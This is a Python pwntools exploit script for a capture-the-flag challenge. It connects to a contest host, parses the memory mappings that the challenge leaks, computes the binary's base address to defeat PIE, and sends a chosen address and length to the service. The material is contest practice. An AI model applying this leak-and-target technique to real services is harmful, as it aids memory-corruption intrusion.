#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./chal_patched --host wfw1.2023.ctfcompetition.com --port 1337
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'wfw1.2023.ctfcompetition.com'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
  '''Execute the target binary locally'''
  if args.GDB:
    return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
  else:
    return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
  '''Connect to the process on the remote host'''
  io = connect(host, port)
  if args.GDB:
    gdb.attach(io, gdbscript=gdbscript)
  return io

def start(argv=[], *a, **kw):
  '''Start the exploit against the target.'''
  if args.LOCAL:
    return start_local(argv, *a, **kw)
  else:
    return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

def parse_maps(maps):
  elf_base = int(maps.split(b'-')[0], 16)
  return elf_base


io = start()

io.recvuntil(b"I'll give you my mappings so that you'll have a shot.")
maps = io.recvuntil(b'\n\n')

elf_base = parse_maps(maps)
log.info('Elf start: ' + hex(elf_base))
#pause()

io.recvuntil(b'Send me nothing and I will happily expire')

string_addr = elf_base + 0x21e0
io.sendline(f'{hex(string_addr)} 100'.encode())

io.interactive()

